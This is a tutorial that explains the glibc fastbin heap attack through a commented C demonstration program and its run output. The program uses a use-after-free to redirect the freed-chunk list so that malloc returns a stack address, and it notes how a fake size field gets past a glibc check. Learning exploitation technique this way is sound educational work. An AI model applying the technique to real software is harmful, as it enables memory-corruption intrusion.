# fastbin attack explanation

This isn't a ctf challenge. Essentially it's really well documented C code that carries out a fastbin attack, and explains how it works. The source code and the binary can be found in here. Try looking at the source code and running the binary to see how the attack works:

The code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
Structure for creating fake chunks
*/
struct malloc_chunk {
	long prev_size; // The prev_size is only used if the previous chunk is free.
	long size;      // The size of the current chunk. The first three bits are used for flags for GLibC
	struct malloc_chunk* fd; 
	struct malloc_chunk* bk;
};


int main(void)
{
    puts("Today we will be discussing a fastbin attack.");
    puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
    puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
    puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
    puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
    puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
    puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
    puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
    puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

    puts("Let's start, we will allocate three chunks of size 0x30\n");
    unsigned long *ptr0, *ptr1, *ptr2;

    ptr0 = malloc(0x30);
    ptr1 = malloc(0x30);
    ptr2 = malloc(0x30);

    printf("Chunk 0: %p\n", ptr0);
    printf("Chunk 1: %p\n", ptr1);
    printf("Chunk 2: %p\n\n", ptr2);


    printf("Next make a fake chunk on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

    struct malloc_chunk my_chunk;
    my_chunk.prev_size = 0x0; // Does not matter, for our concern 
    my_chunk.size = 0x41; // 0x40 will fit in the bin that we are allocating too. Additionally, we set the PREV_INUSE in order avoid additional checks with the prev_size field
    my_chunk.fd = 0x0; // fd ptr 
    my_chunk.bk = 0x0; // bk ptr

    printf("Chunk Info: prev_size: %ld, size: %ld, forward ptr: %p, forward ptr %p, Address of Fake chunk: %p\n\n", my_chunk.prev_size, my_chunk.size, my_chunk.fd, my_chunk.bk, &my_chunk);

    printf("We set the size to 0x41 because 0x40 is the same bin that the other malloced chunks are in.\n This bypasses a security check in newer versions of GLibC"); 
    printf("Set the PREV_INUSE bit (bit 0) in order to avoid dealing with chunks in reverse and the PREV_SIZE field");
    printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

    char *data0 = "00000000";
    char *data1 = "11111111";
    char *data2 = "22222222";

    memcpy(ptr0, data0, 0x8);
    memcpy(ptr1, data1, 0x8);
    memcpy(ptr2, data2, 0x8);

    printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

    printf("Chunk 0: %s\n", (char *)ptr0);
    printf("Chunk 1: %s\n", (char *)ptr1);
    printf("Chunk 2: %s\n\n", (char *)ptr2);

    printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

    free(ptr0);
    free(ptr1);
    free(ptr2);

    printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
    printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
    printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

    printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


    printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
    printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

    *ptr1 = (unsigned long)((char *)&my_chunk);

    printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


    printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable. It should be noted that the fastbin is LIFO (last in first out).\n");
    printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

    unsigned long *ptr3, *ptr4, *ptr5;

    ptr3 = malloc(0x30);
    ptr4 = malloc(0x30);
    ptr5 = malloc(0x30);

    printf("Chunk 3: %p\n", ptr3);
    printf("Chunk 4: %p\n", ptr4);
    printf("Chunk 5: %p\t", ptr5);

    printf("NOTICE: The stack variable, that we assigned earlier, is the same as the chunk 5 pointer, just 0x10 more because of the metadata at the beginning\n");
    printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}

```

When we run it:

```
$	./fastbinAttack 
Today we will be discussing a fastbin attack.
There are 10 fastbins, which act as linked lists (they're separated by size).
When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.
Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).
(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)

This attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.
Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.
So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.

So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.

Let's start, we will allocate three chunks of size 0x30

Chunk 0: 0x14e2420
Chunk 1: 0x14e2460
Chunk 2: 0x14e24a0

Next make a fake chunk on the stack. Our goal will be to allocate a chunk to this variable (because why not).
Chunk Info: prev_size: 0, size: 65, forward ptr: (nil), forward ptr (nil), Address of Fake chunk: 0x7ffca33b3410

We set the size to 0x41 because 0x40 is the same bin that the other malloced chunks are in.
 This bypasses a security check in newer versions of GLibCSet the PREV_INUSE bit (bit 0) in order to avoid dealing with chunks in reverse and the PREV_SIZE fieldProceeding that I'm going to write just some data to the three heap chunks
We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.
Chunk 0: 00000000
Chunk 1: 11111111
Chunk 2: 22222222

Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.
Chunk0 @ 0x0x14e2420	 contains: 0
Chunk1 @ 0x0x14e2460	 contains: 14e2410
Chunk2 @ 0x0x14e24a0	 contains: 14e2450

So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.

Now we will edit a freed chunk (specifically the second chunk "Chunk 1"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.
We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.

We can see it's new value of Chunk1 @ 0x14e2460	 hold: 0x7ffca33b3410

Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.
When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.

Chunk 3: 0x14e24a0
Chunk 4: 0x14e2460
Chunk 5: 0x7ffca33b3420	NOTICE: The stack variable, that we assigned earlier, is the same as the chunk 5 pointer, just 0x10 more

Just like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!

